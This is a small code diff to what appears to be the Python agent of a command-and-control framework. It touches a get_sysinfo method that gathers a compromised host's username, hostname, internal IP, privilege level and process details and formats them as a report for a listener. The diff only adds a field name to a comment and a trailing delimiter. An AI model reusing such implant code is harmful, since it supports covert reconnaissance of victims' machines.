@@ -959,7 +959,7 @@ class MainAgent:
     def get_sysinfo(self, server, nonce='00000000'):
         # NOTE: requires global variable "server" to be set
 
-        # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version | architecture
+        # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version | architecture | dotnet_version
         __FAILED_FUNCTION = '[FAILED QUERY]'
 
         try:
@@ -1016,7 +1016,7 @@ class MainAgent:
             processName = b" ".join(parts[1].split()[4:]).decode('UTF-8')
         else:
             processName = 'python'
-        return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (
+        return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|" % (
         nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language,
         pyVersion, architecture)
 
